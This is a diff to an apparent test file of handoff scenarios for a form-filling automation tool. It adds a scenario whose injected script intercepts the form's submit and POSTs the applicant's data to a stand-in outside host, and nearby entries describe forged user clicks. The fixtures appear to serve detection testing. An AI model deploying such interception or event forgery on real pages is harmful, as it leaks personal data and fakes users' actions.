@@ -222,6 +222,7 @@ HANDOFF_SCENARIOS = (
     "security_code_slow",         # the code POST is answered two seconds after it arrives (a real submit takes one to three)
     "security_code_retry",        # the code widget submits on the 8th box and again every 2.5 s until the page moves on
     "security_code_forger",       # the code widget fakes the student's press (a script click, a made-up event, every function on window), then submits
+    "form_posts_elsewhere",       # the form sends its application to an address the app does not recognize (the page's own submit listener)
     "challenge",                  # the answer to the POST is a visible reCAPTCHA challenge frame
     "bframe_hidden",              # a reCAPTCHA frame is loaded but invisible, and the POST is refused with a 422
 )
@@ -274,6 +275,11 @@ _HANDOFF_SCRIPTS = {
         form.requestSubmit();
       }
     })();""" % _FORM,
+    "form_posts_elsewhere": """document.addEventListener("submit", function (e) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      fetch("https://apply.example-robotics.test/submit", {method: "POST", body: new URLSearchParams(new FormData(%s))}).catch(function () {});
+    }, true);""" % _FORM,
     "upload_on_attach_unmarked": """document.getElementById("resume").addEventListener("change", function (e) { %s });""" % (_UPLOAD % "resume"),
     "upload_cover_letter": """document.getElementById("cover_letter").addEventListener("change", function (e) { %s });""" % (_UPLOAD % "cover"),
     "error_echoes_input": """window.grAfterSubmit = function (response) {
